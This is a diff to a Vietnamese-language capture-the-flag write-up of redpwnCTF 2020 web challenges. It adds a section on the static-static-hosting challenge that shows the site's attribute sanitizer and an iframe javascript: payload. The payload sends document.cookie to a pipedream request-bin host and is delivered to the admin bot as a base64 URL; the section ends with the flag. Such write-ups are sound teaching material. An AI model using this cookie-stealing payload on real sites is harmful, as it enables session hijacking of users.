@@ -58,13 +58,13 @@ Nhìn sơ qua có vẻ như là chèn `simple SQLi`, nên đã thử `user: admi
   <summary>Challenge Description</summary>
   
  I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here
-<br />
+
   Site: static-pastebin.2020.redpwnc.tf
-<br />
+
   Note: The site is entirely static. Dirbuster will not be useful in solving it.
 </details>
 
-Chall này có thể hiểu theo cách đơn giản nhất là thông qua 2 sites của chall thì 1 site sẽ tạo URL và site còn lại upload URL kèm XSS đó lên và Bot Admin sẽ truy cập thông qua URL đó trả về cookie kèm theo flag. Chall này được gọi là DOM-XSS.
+Chall này có thể hiểu theo cách đơn giản nhất là thông qua 2 sites của chall thì 1 site sẽ tạo URL và site còn lại upload URL kèm XSS đó lên và Bot Admin sẽ truy cập thông qua URL đó trả về cookie kèm theo flag. Chall này được gọi là Reflected-XSS.
 
 ![Static-pastebin-site-1](../img/26062020/3.png)
 
@@ -185,3 +185,60 @@ Chỉ cần filter lại cho member khác 0, mình chỉ cần set lại usernam
 </details>
 
 ***
+
+# static-static-hosting
+
+<details>
+  <summary>Challenge Description</summary>
+  
+Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me here
+
+Site: static-static-hosting.2020.redpwnc.tf
+
+Note: The site is entirely static. Dirbuster will not be useful in solving it.
+</details>
+
+Phần này có vẻ tác giả upgrade lên 1 tí thay vì submite text thì được submit thẳng các tags HTML, vì thế mình đoán sẽ filter `script` nên cứ submit rồi xem thử, quả như dự đoán. Code của file `index.js`:
+
+```javascript
+function sanitize(element) {
+    const attributes = element.getAttributeNames();
+    for (let i = 0; i < attributes.length; i++) {
+        // Let people add images and styles
+        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
+            element.removeAttribute(attributes[i]);
+        }
+    }
+
+    const children = element.children;
+    for (let i = 0; i < children.length; i++) {
+        if (children[i].nodeName === 'SCRIPT') {
+            element.removeChild(children[i]);
+            i --;
+        } else {
+            sanitize(children[i]);
+        }
+    }
+}
+```
+
+Vậy mình thử dùng `iframe` thẻ này nhúng HTML, text, picture, video hay link vào trong khung của chính mình.
+
+```
+<iframe src="javascript:window.location.href='https://[RequestBinURL].m.pipedream.net
+?='+document.cookie">
+```
+Sau đó upcode sang site thứ 2 gửi cho Admin-bot
+
+```
+https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vZDRkZTE1N2Q0NTRmZGY2OTM1ZWQwOTU0YjgyNmE0ZjUubS5waXBlZHJlYW0ubmV0Cj8nK2RvY3VtZW50LmNvb2tpZSI+
+```
+Hên quá test thử phát 1 ra liền, đỡ tốn công hihi
+
+<img src="/img/26062020/6.png" alt="Static-static-bin" align="center"/>
+
+<details>
+  <summary>FLAG</summary>
+  
+  flag{wh0_n33d5_d0mpur1fy}
+</details>
